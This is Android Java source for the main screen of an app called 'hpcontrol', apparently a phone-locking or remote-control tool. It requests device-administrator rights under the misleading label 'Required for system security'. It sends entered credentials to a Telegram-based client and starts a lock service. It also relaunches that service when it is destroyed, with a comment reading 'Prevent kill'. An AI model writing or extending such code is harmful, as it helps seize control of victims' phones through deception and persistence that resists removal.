package com.hpcontrol;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    private EditText etUsername, etPassword;
    private Button btnLogin;
    private SharedPreferences prefs;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        prefs = getSharedPreferences("hpcontrol", MODE_PRIVATE);
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        // Auto aktifkan device admin
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security");
            startActivityForResult(intent, 1);
        }
        
        etUsername = findViewById(R.id.etUsername);
        etPassword = findViewById(R.id.etPassword);
        btnLogin = findViewById(R.id.btnLogin);
        
        // Cek apakah sudah login sebelumnya
        if (prefs.getBoolean("registered", false)) {
            startLockService();
            finish();
        }
        
        btnLogin.setOnClickListener(v -> {
            String user = etUsername.getText().toString();
            String pass = etPassword.getText().toString();
            
            // Kirim ke server/telegram untuk validasi
            TelegramClient.registerDevice(this, user, pass, new TelegramClient.Callback() {
                @Override
                public void onSuccess(String deviceId) {
                    prefs.edit().putBoolean("registered", true)
                         .putString("device_id", deviceId).apply();
                    startLockService();
                    finish();
                }
                
                @Override
                public void onError(String error) {
                    Toast.makeText(MainActivity.this, "Login gagal!", Toast.LENGTH_SHORT).show();
                }
            });
        });
    }
    
    private void startLockService() {
        Intent serviceIntent = new Intent(this, LockService.class);
        startForegroundService(serviceIntent);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Prevent kill
        Intent serviceIntent = new Intent(this, LockService.class);
        startForegroundService(serviceIntent);
    }
}